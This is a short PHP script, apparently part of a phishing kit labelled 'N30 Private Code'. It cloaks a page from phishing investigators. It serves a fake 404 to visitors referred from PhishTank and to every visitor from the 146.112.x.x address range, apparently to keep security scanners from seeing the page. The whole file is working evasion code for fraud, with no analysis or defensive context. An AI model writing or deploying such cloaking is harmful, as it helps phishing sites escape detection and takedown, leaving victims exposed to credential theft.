<?php
/**
###############################################
#$           N30 Private Code                $#
#$          Copyright 2020 Custom       $#
###############################################
**/
### Perform a HTTP REFERER check on the visitor to see if they are coming from the Phishtank website ###

		if(isset($_SERVER['HTTP_REFERER'])) {
		 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'phishtank.com') {
			header("HTTP/1.0 404 Not Found");exit();
		}
		}

		if(isset($_SERVER['HTTP_REFERER'])) {
		 if(parse_url($_SERVER['HTTP_REFERER'], PHP_URL_HOST) == 'www.phishtank.com') {
			header("HTTP/1.0 404 Not Found");exit();

		}
		}

 ### Check if the ip between 146.112.0.0 And 146.112.255.255 ###
	$range_start = ip2long("146.112.0.0");
	$range_end   = ip2long("146.112.255.255");
	$ip2long       = ip2long($_SERVER['REMOTE_ADDR']);

	 if ($ip2long >= $range_start && $ip2long <= $range_end){
			header("HTTP/1.0 404 Not Found");exit();

	 }



?>